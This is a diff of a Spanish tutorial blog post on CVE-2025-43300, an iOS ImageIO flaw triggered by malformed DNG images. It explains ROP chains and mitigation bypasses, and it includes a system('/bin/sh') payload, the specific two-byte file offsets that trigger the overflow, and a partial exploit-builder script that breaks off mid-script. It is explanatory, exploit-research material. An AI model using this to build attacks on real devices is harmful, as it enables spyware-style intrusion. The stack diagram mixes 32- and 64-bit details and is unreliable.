+<p>Imagina que el programa es un mensajero que sigue un mapa. En el mapa, cada paso tiene una dirección escrita. El mensajero siempre mira la dirección actual para saber a dónde ir después.</p>
+<ol>
+<li><strong>El Programa Normal</strong>: El mensajero lee su mapa: “Ve a la dirección A, luego a la B, luego a la C”.</li>
+<li><strong>El Ataque</strong>: El desbordamiento permite al atacante <strong>borrar la dirección “C”</strong> del mapa y escribir, en su lugar, la dirección <strong>“X”</strong>, que es una zona de memoria controlada por el atacante.</li>
+<li><strong>La Desviación</strong>: El mensajero, confiado, llega a la dirección B y mira su mapa para saber el siguiente paso. En lugar de “C”, ahora lee “X”. Sin saberlo, <strong>se desvía de su ruta original</strong> y se dirige a la zona controlada por el atacante.</li>
+</ol>
+<p>En términos técnicos, el atacante ha <strong>secuestrado el flujo de control</strong> del programa. El programa ahora ejecutará las instrucciones que el atacante haya colocado en la dirección “X”, en lugar de las que debería ejecutar.</p>
+<hr>
+<h2 id="-la-cadena-rop-construyendo-con-piezas-de-lego-del-sistema">🧩 La Cadena ROP: Construyendo con Piezas de Lego del Sistema</h2>
+<p>Ahora, el atacante tiene el control y puede dirigir al programa a donde quiera. Pero hay un gran problema: en los sistemas modernos como iOS, no se puede simplemente ejecutar código nuevo. La memoria donde se escriben los datos (como la imagen) <strong>no es ejecutable</strong> por seguridad.</p>
+<p>Aquí es donde entra en juego la programación orientada a retornos, o <strong>ROP (Return-Oriented Programming)</strong>. En lugar de intentar ejecutar su propio código, el atacante <strong>reutiliza el código que ya existe en el sistema</strong>.</p>
+<h3 id="la-analogía-de-las-piezas-de-lego">La Analogía de las Piezas de Lego</h3>
+<p>Imagina que quieres construir un robot (el código malicioso), pero no te dejan usar tus propias piezas (tu código). Solo puedes usar las piezas que ya hay en la habitación (el código del sistema, como el de iOS).</p>
+<ol>
+<li><strong>Los “Gadgets” (Las Piezas)</strong>: El atacante busca en la memoria del sistema pequeños fragmentos de código ya existentes que terminen con una instrucción de <code>ret</code> (retorno). Cada uno de estos fragmentos hace una cosa muy simple, como “sumar dos números” o “mover un valor”. Estos fragmentos se llaman <strong>gadgets</strong>.</li>
+<li><strong>El Encadenamiento</strong>: El atacante apila (encadena) las direcciones de estos gadgets en la memoria, uno tras otro. Es como si escribiera una lista de instrucciones: “Primero, ejecuta el gadget que está en la dirección G1, luego el de G2, luego el de G3…”.</li>
+<li><strong>La Ejecución</strong>: Al desviar el flujo de control hacia el primer gadget de la cadena (G1), este se ejecuta y, al llegar a su <code>ret</code>, automáticamente “retorna” a la siguiente dirección que el atacante ha colocado en la pila (G2). El programa salta de un gadget a otro, como si estuviera siguiendo una coreografía.</li>
+</ol>
+<h3 id="cómo-se-construye-una-cadena-rop">¿Cómo se construye una cadena ROP?</h3>
+<p>Construir una cadena ROP es como resolver un puzle de precisión. Estos son los pasos:</p>
+<h4 id="1-encontrar-los-gadgets">1. Encontrar los Gadgets</h4>
+<p>Se usan herramientas como <strong>ROPgadget</strong>, <strong>Ropper</strong> o <strong>rp++</strong> para buscar en el binario o en las librerías del sistema todos los posibles gadgets.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#6A737D"># Buscar gadgets que contengan "pop rdi"</span></span>
+<span class="line"><span style="color:#B392F0">ROPgadget</span><span style="color:#79B8FF"> --binary</span><span style="color:#9ECBFF"> ./vulnerable</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> grep</span><span style="color:#9ECBFF"> "pop rdi"</span></span></code></pre>
+<h4 id="2-diseñar-la-cadena">2. Diseñar la Cadena</h4>
+<p>El objetivo es encadenar gadgets para, por ejemplo, llamar a la función <code>system()</code> y ejecutar <code>/bin/sh</code>. En sistemas de 64 bits, el primer argumento se pasa en el registro <code>rdi</code>. Por tanto, necesitamos un gadget que nos permita controlar <code>rdi</code>, como <code>pop rdi; ret</code>.</p>
+<h4 id="3-construir-la-cadena-en-la-pila">3. Construir la Cadena en la Pila</h4>
+<p>Con el gadget y las direcciones conocidas, construimos la cadena en la pila. La pila, en el momento del ataque, debe tener un aspecto similar a esto:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0"><code><span class="line"><span>Dirección        Valor</span></span>
+<span class="line"><span>0xffff0008:      0x00000000      &#x3C;- Argumento 2 (si lo hay)</span></span>
+<span class="line"><span>0xffff0004:      0x0068732f      &#x3C;- Argumento 1 (puntero a "/bin/sh")</span></span>
+<span class="line"><span>0xffff0000:      0x00400560      &#x3C;- Dirección de system()</span></span></code></pre>
+<p>Cuando el programa ejecute el <code>ret</code> del gadget <code>pop rdi</code>, la pila estará preparada para que el siguiente <code>ret</code> salte a <code>system()</code>, como si se hubiera llamado de forma normal.</p>
+<h3 id="ejemplo-práctico-en-código-x64">Ejemplo Práctico en Código (x64)</h3>
+<p>Imagina un binario vulnerable en x64. Queremos llamar a <code>system("/bin/sh")</code>.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#6A737D"># Encontramos las direcciones</span></span>
+<span class="line"><span style="color:#E1E4E8">addr_system </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">400560</span></span>
+<span class="line"><span style="color:#E1E4E8">addr_binsh </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">600a00</span><span style="color:#6A737D">    # puntero a la cadena "/bin/sh"</span></span>
+<span class="line"><span style="color:#E1E4E8">gadget_pop_rdi </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">4005c3</span><span style="color:#6A737D">  # pop rdi; ret</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Construimos el payload</span></span>
+<span class="line"><span style="color:#E1E4E8">payload </span><span style="color:#F97583">=</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">"A"</span><span style="color:#F97583">*</span><span style="color:#79B8FF">40</span><span style="color:#6A737D">          # Relleno hasta el EIP/RIP</span></span>
+<span class="line"><span style="color:#E1E4E8">payload </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> p64(gadget_pop_rdi)  </span><span style="color:#6A737D"># Dirección del gadget</span></span>
+<span class="line"><span style="color:#E1E4E8">payload </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> p64(addr_binsh)      </span><span style="color:#6A737D"># Argumento para system()</span></span>
+<span class="line"><span style="color:#E1E4E8">payload </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> p64(addr_system)     </span><span style="color:#6A737D"># Dirección de system()</span></span></code></pre>
+<p>Al enviar este payload, el flujo del programa será:</p>
+<ol>
+<li><code>ret</code> → salta a <code>gadget_pop_rdi</code></li>
+<li><code>pop rdi</code> → carga <code>addr_binsh</code> en <code>rdi</code></li>
+<li><code>ret</code> → salta a <code>system(addr_binsh)</code></li>
 </ol>
 <hr>
-<h3 id="️-el-proceso-técnico-de-explotación-rce-paso-a-paso">⚙️ El Proceso Técnico de Explotación (RCE Paso a Paso)</h3>
-<p>Para comprender la ingeniería detrás de la Ejecución Remota de Código (RCE), este es el proceso paso a paso:</p>
-<h4 id="1-la-corrupción-de-memoria-heap-overflow">1. La Corrupción de Memoria (Heap Overflow)</h4>
-<p>El <code>heap</code> es la zona de memoria dinámica donde los programas crean y destruyen objetos sobre la marcha.</p>
+<h2 id="️-sortear-las-defensas-de-ios-cómo-se-burlan-las-mitigaciones">🛡️ Sortear las Defensas de iOS: Cómo se Burlan las Mitigaciones</h2>
+<p>iOS es un sistema operativo con múltiples capas de seguridad. Un atacante no puede simplemente ejecutar su código; debe encontrar la manera de esquivar cada una de ellas. Para el ataque de WhatsApp, se necesitaron técnicas específicas.</p>
+<h3 id="1-aslr-address-space-layout-randomization">1. ASLR (Address Space Layout Randomization)</h3>
 <ul>
-<li>Los metadatos TIFF engañan a <code>RawCamera.bundle</code> para que reserve un búfer reducido.</li>
-<li>La rutina de decodificación del stream JPEG lee el marcador comprimido y <strong>escribe más datos de los que caben en el búfer asignado</strong>, desbordando el bloque de memoria contiguo.</li>
+<li><strong>¿Qué es?</strong> ASLR es una técnica que <strong>aleatoriza las direcciones de memoria</strong> de las librerías, el núcleo y la aplicación cada vez que se inicia el sistema. Esto hace que sea imposible para el atacante conocer de antemano la dirección exacta de los gadgets que necesita.</li>
+<li><strong>¿Cómo se sortea?</strong> Para burlar ASLR, el atacante necesita <strong>filtrar una dirección de memoria legítima</strong>. En el caso de este ataque, la vulnerabilidad en ImageIO no solo permitía el desbordamiento, sino que también podía ser usada para <strong>leer memoria</strong> (lo que se conoce como “primitive de lectura”). Al leer una dirección de una librería conocida (como la de <code>ImageIO</code>), el atacante puede calcular la <strong>base de la librería</strong> y, a partir de ahí, conocer la ubicación exacta de todos los demás gadgets.</li>
 </ul>
-<h4 id="2-la-desviación-del-flujo-de-control-control-flow-hijacking">2. La Desviación del Flujo de Control (Control Flow Hijacking)</h4>
-<p>El objetivo no es simplemente provocar un fallo (<em>crash</em>), sino tomar el control de la ejecución.</p>
+<p><strong>Analogía</strong>: Es como si, al saber la dirección de una sola casa en una calle, pudieras calcular la dirección de todas las demás.</p>
+<h3 id="2-pxn-privileged-execute-never--pan-privileged-access-never">2. PXN (Privileged Execute-Never) / PAN (Privileged Access Never)</h3>
 <ul>
-<li>Al sobrescribir la memoria contigua en el <em>heap</em>, el atacante logra modificar <strong>punteros de función</strong> o estructuras de vtable de objetos C++.</li>
-<li>La siguiente vez que el sistema operativo intenta llamar a un método sobre ese objeto corrompido, la CPU salta a la dirección inyectada por el atacante.</li>
+<li><strong>¿Qué es?</strong> PXN (y su equivalente en espacio de usuario, el <code>PAGE_EXECUTE_NEVER</code>) es una protección que <strong>impide que el procesador ejecute código que se encuentra en páginas de memoria que son de datos</strong>. Esto significa que, aunque el atacante coloque su código malicioso en el heap (que es una zona de datos), no podrá ejecutarlo directamente.</li>
+<li><strong>¿Cómo se sortea?</strong> La cadena ROP es la respuesta. El atacante <strong>no ejecuta su propio código desde el heap</strong>. En su lugar, ejecuta código que <strong>ya existe</strong> en las páginas de memoria que son legítimamente ejecutables (como las del propio sistema operativo o de la aplicación). La cadena ROP orquesta una coreografía para que el sistema, sin saberlo, realice las acciones del atacante usando solo su propio código.</li>
 </ul>
-<h4 id="3-evadiendo-protecciones-con-cadenas-rop-return-oriented-programming">3. Evadiendo Protecciones con Cadenas ROP (Return-Oriented Programming)</h4>
-<p>En iOS moderno existen protecciones estrictas como <strong>W^X</strong> (<em>Write XOR Execute</em>) y <strong>PAC</strong> (<em>Pointer Authentication Codes</em>), que impiden ejecutar código nuevo inyectado directamente en memoria de datos.</p>
+<h3 id="3-kaslr-kernel-aslr-y-el-sandbox">3. KASLR (Kernel ASLR) y el Sandbox</h3>
 <ul>
-<li><strong>¿Qué es ROP?</strong>: En lugar de inyectar código nuevo, el atacante reutiliza fragmentos de código legítimo ejecutable que ya existen en la memoria de iOS (dentro de librerías del sistema como <code>libsystem_kernel.dylib</code>). Estos fragmentos se conocen como <strong>gadgets</strong> y finalizan con una instrucción de retorno (<code>ret</code>).</li>
-<li><strong>Encadenamiento</strong>: El atacante construye una pila con las direcciones de estos <em>gadgets</em>. Al saltar al primero, este realiza una pequeña instrucción, ejecuta <code>ret</code> y salta automáticamente al siguiente gadget. Con esto, el atacante puede realizar operaciones complejas, como reconfigurar los permisos de memoria.</li>
+<li><strong>¿Qué son?</strong> KASLR es la versión de ASLR para el núcleo (kernel) del sistema. El <strong>sandbox</strong> es un sistema de permisos que restringe lo que una aplicación puede hacer, incluso si está comprometida. Por ejemplo, WhatsApp no tiene permisos para acceder a los archivos de tu sistema operativo.</li>
+<li><strong>¿Cómo se sortean?</strong> Normalmente, el objetivo de un ataque de este tipo es <strong>escapar del sandbox</strong>. Para ello, el atacante necesita conocer direcciones del núcleo (para lo que necesita burlar KASLR) y luego usar su cadena ROP para llamar a funciones del núcleo que le den más permisos. Esto se hace, por ejemplo, usando la vulnerabilidad para leer direcciones del núcleo (burlar KASLR) y luego usando ROP para ejecutar una llamada al sistema (<code>syscall</code>) que modifique los privilegios del proceso, permitiéndole salir del sandbox.</li>
 </ul>
-<h4 id="4-ejecución-del-payload-final">4. Ejecución del Payload Final</h4>
-<p>Una vez que la cadena ROP ha deshabilitado las restricciones de memoria, el atacante logra ejecutar su <em>payload</em> final con los privilegios del proceso afectado:</p>
-<ul>
-<li><strong>Acceso a datos confidenciales:</strong> Lectura de mensajes, contactos y archivos locales.</li>
-<li><strong>Persistencia o escalado:</strong> Explotación del kernel para obtener acceso <em>root</em>.</li>
-<li><strong>Monitoreo silencioso:</strong> Activación no autorizada de sensores o servicios.</li>
-</ul>
+<h3 id="4-pointer-authentication-codes-pac">4. Pointer Authentication Codes (PAC)</h3>
+<p>Aunque no se mencionó en el análisis inicial de este CVE, es probable que el exploit también tuviera que lidiar con <strong>PAC</strong>. Es una de las defensas más modernas de Apple. PAC añade una “firma criptográfica” a los punteros. Si un atacante corrompe un puntero, la firma deja de ser válida y el sistema se bloquea. Para sortear PAC, los ataques más sofisticados buscan gadgets que permitan “firmar” punteros de forma válida o que directamente no utilicen punteros firmados.</p>
 <hr>
-<h2 id="-la-precisión-de-los-2-bytes">🔬 La Precisión de los 2 Bytes</h2>
-<p>Lo más impactante de esta vulnerabilidad es su simplicidad en la capa de entrada: en un archivo DNG legítimo de muestra (extraído de cámaras como la Pentax K-3 Mark III), bastaba con modificar <strong>únicamente dos bytes</strong> mediante edición hexadecimal para activar el fallo:</p>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<table><thead><tr><th align="left">Offset Hexadecimal</th><th align="left">Valor Original</th><th align="left">Valor Modificado</th><th align="left">Alteración realizada</th></tr></thead><tbody><tr><td align="left"><code>0x2FD00</code></td><td align="left"><code>0x01</code></td><td align="left"><code>0x02</code></td><td align="left">Elevación del parámetro <code>SamplesPerPixel</code></td></tr><tr><td align="left"><code>0x3E40B</code></td><td align="left"><code>0x02</code></td><td align="left"><code>0x01</code></td><td align="left">Reducción del marcador <code>NumComponents</code></td></tr></tbody></table>
-<hr>
-<h2 id="️-demostración-de-concepto-poc-y-análisis">🖥️ Demostración de Concepto (PoC) y Análisis</h2>
-<p><em>Nota: Los scripts expuestos son recreaciones con fines analíticos y de auditoría de parches.</em></p>
-<h3 id="1-inspección-de-inconsistencias-en-dng">1. Inspección de Inconsistencias en DNG</h3>
-<p>Mediante un script de análisis en Python, los investigadores verificaban los offsets antes de forzar la mutación del archivo:</p>
-<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#6A737D"># dng_vulnerability_analyzer.py</span></span>
+<h2 id="-el-código-prueba-de-concepto-paso-a-paso">💻 El Código: Prueba de Concepto Paso a Paso</h2>
+<p>Ahora que hemos entendido la teoría, veamos el código real que se ha compartido en la comunidad de investigación para modificar el archivo DNG y crear el payload.</p>
+<h3 id="script-modificador-de-dng-para-cve-2025-43300">Script: Modificador de DNG para CVE-2025-43300</h3>
+<p>Este script en Python, basado en el trabajo de investigadores como los de <code>PwnToday</code> y <code>hunters-sec</code>, modifica los dos bytes críticos en un archivo DNG legítimo para crear el payload malicioso.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#6A737D">#!/usr/bin/env python3</span></span>
+<span class="line"><span style="color:#6A737D"># dng_exploit_builder.py</span></span>
+<span class="line"><span style="color:#6A737D"># Proof of Concept educativo para CVE-2025-43300</span></span>
+<span class="line"><span style="color:#6A737D"># Basado en el análisis de investigadores de seguridad</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> argparse</span></span>
+<span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> os</span></span>
+<span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> sys</span></span>
 <span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> struct</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#F97583">def</span><span style="color:#B392F0"> analyze_dng</span><span style="color:#E1E4E8">(file_path):</span></span>
-<span class="line"><span style="color:#F97583">    with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(file_path, </span><span style="color:#9ECBFF">"rb"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> f:</span></span>
-<span class="line"><span style="color:#E1E4E8">        content </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> f.read()</span></span>
+<span class="line"><span style="color:#F97583">def</span><span style="color:#B392F0"> analyze_dng</span><span style="color:#E1E4E8">(filepath):</span></span>
+<span class="line"><span style="color:#9ECBFF">    """</span></span>
+<span class="line"><span style="color:#9ECBFF">    Analiza un archivo DNG y muestra información sobre los campos clave.</span></span>
+<span class="line"><span style="color:#9ECBFF">    """</span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[*] Analizando: </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">filepath</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
 <span class="line"><span style="color:#E1E4E8">    </span></span>
-<span class="line"><span style="color:#6A737D">    # Lectura de offsets específicos en cabecera TIFF y marcador SOF3</span></span>
-<span class="line"><span style="color:#E1E4E8">    samples_per_pixel </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> content[</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">2FD00</span><span style="color:#E1E4E8">]</span></span>
-<span class="line"><span style="color:#E1E4E8">    num_components </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> content[</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">3E40B</span><span style="color:#E1E4E8">]</span></span>
-<span class="line"><span style="color:#E1E4E8">    </span></span>
-<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"📁 Archivo: </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">file_path</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
-<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"  ├── TIFF SamplesPerPixel: </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">samples_per_pixel</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF"> (offset 0x2FD00)"</span><span style="color:#E1E4E8">)</span></span>
-<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"  └── JPEG NumComponents:   </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">num_components</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF"> (offset 0x3E40B)"</span><span style="color:#E1E4E8">)</span></span>
-<span class="line"><span style="color:#E1E4E8">    </span></span>
-<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> samples_per_pixel </span><span style="color:#F97583">!=</span><span style="color:#E1E4E8"> num_components:</span></span>
-<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"⚠️ Inconsistencia detectada. Riesgo de desbordamiento en ImageIO."</span><span style="color:#E1E4E8">)</span></span>
-<span class="line"></span>
-<span class="line"><span style="color:#E1E4E8">analyze_dng(</span><span style="color:#9ECBFF">"IMGP0847.DNG"</span><span style="color:#E1E4E8">)</span></span></code></pre>
-<h3 id="2-generación-del-payload-de-prueba">2. Generación del Payload de Prueba</h3>
-<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#6A737D"># hex_modifier.py</span></span>
-<span class="line"><span style="color:#F97583">def</span><span style="color:#B392F0"> generate_poc</span><span style="color:#E1E4E8">(input_dng, output_dng):</span></span>
-<span class="line"><span style="color:#F97583">    with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(input_dng, </span><span style="color:#9ECBFF">"rb"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> f:</span></span>
+<span class="line"><span style="color:#F97583">    with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(filepath, </span><span style="color:#9ECBFF">'rb'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> f:</span></span>
 <span class="line"><span style="color:#E1E4E8">        data </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> bytearray</span><span style="color:#E1E4E8">(f.read())</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    # Buscar el marcador TIFF (0x4949 o 0x4D4D)</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> data[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">==</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">'II'</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Endianness: Little-Endian (II)"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">        endian </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '&#x3C;'</span></span>
+<span class="line"><span style="color:#F97583">    elif</span><span style="color:#E1E4E8"> data[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">==</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">'MM'</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Endianness: Big-Endian (MM)"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">        endian </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '>'</span></span>
+<span class="line"><span style="color:#F97583">    else</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] No es un archivo TIFF válido"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> None</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    # Offset al primer IFD (Image File Directory)</span></span>
+<span class="line"><span style="color:#E1E4E8">    ifd_offset </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> struct.unpack(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">endian</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">I"</span><span style="color:#E1E4E8">, data[</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">])[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">]</span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[+] Primer IFD en: 0x</span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">ifd_offset</span><span style="color:#F97583">:04x</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    # Leer el número de entradas en el IFD</span></span>
+<span class="line"><span style="color:#E1E4E8">    num_entries </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> struct.unpack(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">endian</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">H"</span><span style="color:#E1E4E8">, data[ifd_offset:ifd_offset</span><span style="color:#F97583">+</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">])[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">]</span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[+] Número de entradas: </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">num_entries</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    # Buscar la etiqueta SamplesPerPixel (0x0115)</span></span>
+<span class="line"><span style="color:#E1E4E8">    samples_tag </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">0115</span></span>
+<span class="line"><span style="color:#E1E4E8">    samples_offset </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> None</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(num_entries):</span></span>
+<span class="line"><span style="color:#E1E4E8">        entry_offset </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ifd_offset </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 2</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> (i </span><span style="color:#F97583">*</span><span style="color:#79B8FF"> 12</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">        tag </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> struct.unpack(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">endian</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">H"</span><span style="color:#E1E4E8">, data[entry_offset:entry_offset</span><span style="color:#F97583">+</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">])[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">]</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> tag </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> samples_tag:</span></span>
+<span class="line"><span style="color:#E1E4E8">            samples_offset </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> entry_offset </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 8</span><span style="color:#6A737D">  # Offset al valor</span></span>
+<span class="line"><span style="color:#E1E4E8">            samples_value </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> struct.unpack(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">endian</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">H"</span><span style="color:#E1E4E8">, data[samples_offset:samples_offset</span><span style="color:#F97583">+</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">])[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">]</span></span>
+<span class="line"><span style="color:#79B8FF">            print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[+] SamplesPerPixel encontrado en 0x</span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">samples_offset</span><span style="color:#F97583">:04x</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">: </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">samples_value</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">            break</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    # Buscar el marcador SOF3 en el stream JPEG</span></span>
+<span class="line"><span style="color:#6A737D">    # Buscar el patrón FF C3 (marcador SOF3)</span></span>
+<span class="line"><span style="color:#E1E4E8">    sof3_marker </span><span style="color:#F97583">=</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\xFF\xC3</span><span style="color:#9ECBFF">'</span></span>
+<span class="line"><span style="color:#E1E4E8">    sof3_pos </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> data.find(sof3_marker)</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> sof3_pos </span><span style="color:#F97583">!=</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[+] Marcador SOF3 encontrado en 0x</span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">sof3_pos</span><span style="color:#F97583">:04x</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6A737D">        # El número de componentes está en offset + 6</span></span>
